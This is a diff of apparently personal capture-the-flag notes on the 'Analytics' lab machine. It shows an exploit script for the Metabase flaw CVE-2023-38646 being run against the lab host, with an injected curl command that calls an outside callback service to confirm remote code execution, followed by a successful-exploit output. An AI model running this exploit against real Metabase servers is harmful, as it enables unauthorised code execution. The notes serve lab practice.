@@ -6,13 +6,13 @@
 chaning the hosts file
 sudo vim /etc/hosts
 
-                                                                                                                  │  File "/home/johems/.local/lib/python3.11/site-packages/requests/sessions.py", line 589, in request
-10.129.94.209 analytical.htb data.analytical.htb                                                                                            │    resp = self.send(prep, **send_kwargs)
+                                                             
+10.129.94.209 analytical.htb data.analytical.htb                                                                                          
 
 ```
 
 ```bash
-┌──(johems㉿BeastJohe)-[~/HB/Analytics/CVE-2023-38646]
+┌──(johems)-[~/HB/Analytics/CVE-2023-38646]
 └─$ python3 single.py -u http://data.analytical.htb:80 -c "curl sub.requestcatcher.com/some-endpoint"
 Success get token!
 Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
@@ -21,7 +21,7 @@ Base64 Encoded Command: Y3VybCBzdWIucmVxdWVzdGNhdGNoZXIuY29tL3NvbWUtZW5kcG9pbnQ
 Exploit success !
 Check on your own to validity!
 
-┌──(johems㉿BeastJohe)-[~/HB/Analytics/CVE-2023-38646]
+┌──(johems)-[~/HB/Analytics/CVE-2023-38646]
 ```
 
 ```bash
@@ -64,7 +64,6 @@ https://www.youtube.com/watch?v=jaSFeZFARKA
 
 /tmp $ strings sample-database.db.mv.db | grep -r "user" 
 
-The city of the accounto owns an account[PEOPLE.CITY.descriptione[PEOPLE.NAME.description
 ```
 
 # Python webserver
